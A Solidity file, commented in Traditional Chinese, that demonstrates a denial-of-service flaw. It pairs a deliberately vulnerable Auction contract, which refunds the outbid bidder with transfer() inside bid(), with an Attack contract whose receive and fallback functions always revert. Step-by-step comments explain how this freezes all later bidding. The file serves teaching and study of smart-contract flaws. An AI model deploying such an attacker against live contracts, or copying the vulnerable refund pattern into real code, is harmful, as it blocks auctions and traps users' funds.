/* SPDX-License-Identifier: UNLICENSED */
pragma solidity >=0.8.0;

// 漏洞合約：Auction 合約，漏洞名稱：Wrong use of Transfer Credit Function
// 漏洞重點：在 bid() 函數中直接使用 transfer() 執行退款，如果退款失敗則會 revert 整個交易，導致競標流程被凍結。

contract Auction {
    address public highestBidder;
    uint public highestBid;
    
    // 競標函數
    function bid() external payable {
        require(msg.value >= highestBid, "Bid not high enough");
        if (highestBidder != address(0)) {
            // 漏洞重點：直接退款給上一個最高競標者，若該地址拒絕接收 Ether 則整筆交易回滾
            payable(highestBidder).transfer(highestBid);
        }
        highestBidder = msg.sender;
        highestBid = msg.value;
    }

    // 允許合約接收 Ether
    receive() external payable {}
}

// 攻擊合約
// 攻擊者透過此合約參與競標，其 fallback 和 receive 函數故意 revert，導致 Auction 合約在退款時失敗。
contract Attack {
    Auction public auction;

    // 此處修改參數型態為 address payable 以避免類型轉換錯誤
    constructor(address payable _auctionAddress) {
        auction = Auction(_auctionAddress);
    }

    // 攻擊合約參與競標
    // 攻擊方式：
    // 1. 攻擊者部署 Attack 合約，傳入 Auction 合約的地址。
    // 2. 呼叫 attackBid() 以成為目前的最高競標者。
    // 3. 當其他使用者嘗試更高出價時，Auction 的 bid() 函數會嘗試退款給此攻擊合約，因而觸發 revert，凍結競標流程。
    function attackBid() external payable {
        require(msg.value > 0, "Must send some ETH");
        auction.bid{value: msg.value}();
    }

    // 故意拒絕接收 Ether，trigger 退款失敗
    fallback() external payable {
        revert("Attack: Rejecting refund");
    }

    receive() external payable {
        revert("Attack: Rejecting refund");
    }
}
